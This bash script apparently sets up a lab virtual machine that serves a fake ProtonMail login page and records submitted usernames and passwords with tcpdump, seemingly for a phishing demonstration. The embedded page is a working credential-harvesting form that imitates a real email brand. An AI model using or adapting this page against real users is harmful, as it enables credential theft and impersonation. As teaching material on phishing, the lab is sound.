#!/bin/bash
# Setup script for VM3 (Fake Web Server)

echo "=========================================="
echo "Setting up VM3 (Fake Web Server)"
echo "=========================================="

# Network configuration
echo "[*] Configuring network..."
sudo ip addr flush dev eth0
sudo ip addr add 192.168.1.30/24 dev eth0
sudo ip link set eth0 up
sudo ip route add default via 192.168.1.254

# Install required packages
echo "[*] Installing required packages..."
sudo apt update
sudo apt install -y python3 tcpdump

# Create web directory structure
echo "[*] Setting up fake protonmail website..."
WEB_DIR="$HOME/fake-protonmail"
mkdir -p "$WEB_DIR/assets"

# Copy fake website files
if [ -d "fake-protonmail" ]; then
    cp -r fake-protonmail/* "$WEB_DIR/"
else
    echo "[!] Warning: fake-protonmail directory not found"
    echo "[*] Creating basic fake site..."
    cat > "$WEB_DIR/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>ProtonMail - Secure Email</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 350px;
        }
        .logo {
            text-align: center;
            font-size: 32px;
            font-weight: bold;
            color: #8B5CF6;
            margin-bottom: 30px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #8B5CF6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background: #7C3AED;
        }
        .warning {
            display: none;
            background: #fee;
            border: 1px solid #fcc;
            padding: 10px;
            margin: 20px 0;
            border-radius: 5px;
            color: #c33;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🔒 ProtonMail</div>
        <h2>Sign in</h2>
        <div id="warning" class="warning">
            ⚠️ You have been pwned! This is a fake site for educational purposes.
        </div>
        <form id="loginForm" onsubmit="return handleLogin(event)">
            <input type="text" id="username" name="username" placeholder="Username or email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send credentials (in real attack, would be sent to attacker's server)
            console.log('CAPTURED CREDENTIALS:');
            console.log('Username:', username);
            console.log('Password:', password);
            
            // Send as GET request so it appears in tcpdump
            fetch('/login?user=' + encodeURIComponent(username) + '&pass=' + encodeURIComponent(password))
                .catch(err => console.log(err));
            
            // Show warning
            document.getElementById('warning').style.display = 'block';
            
            return false;
        }
    </script>
</body>
</html>
EOF
fi

# Make script to start web server
cat > "$HOME/start-webserver.sh" << 'EOF'
#!/bin/bash
WEB_DIR="$HOME/fake-protonmail"
PCAP_DIR="$HOME/captures"

mkdir -p "$PCAP_DIR"

echo "=========================================="
echo "Starting Fake ProtonMail Web Server"
echo "=========================================="
echo "Web directory: $WEB_DIR"
echo "Listening on: http://192.168.1.30:80"
echo "Capture file: $PCAP_DIR/traffic.pcap"
echo "=========================================="
echo ""

# Start packet capture in background
echo "[*] Starting packet capture..."
sudo tcpdump -i eth0 -w "$PCAP_DIR/traffic.pcap" port 80 &
TCPDUMP_PID=$!

echo "[*] Starting web server..."
cd "$WEB_DIR"
sudo python3 -m http.server 80

# Cleanup
echo ""
echo "[*] Stopping packet capture..."
sudo kill $TCPDUMP_PID 2>/dev/null
echo "[+] Traffic captured to: $PCAP_DIR/traffic.pcap"
EOF

chmod +x "$HOME/start-webserver.sh"

echo ""
echo "[+] VM3 setup complete!"
echo ""
echo "Network Configuration:"
ip addr show eth0 | grep "inet "
echo ""
echo "=========================================="
echo "To start the fake web server:"
echo "  cd ~"
echo "  ./start-webserver.sh"
echo "=========================================="
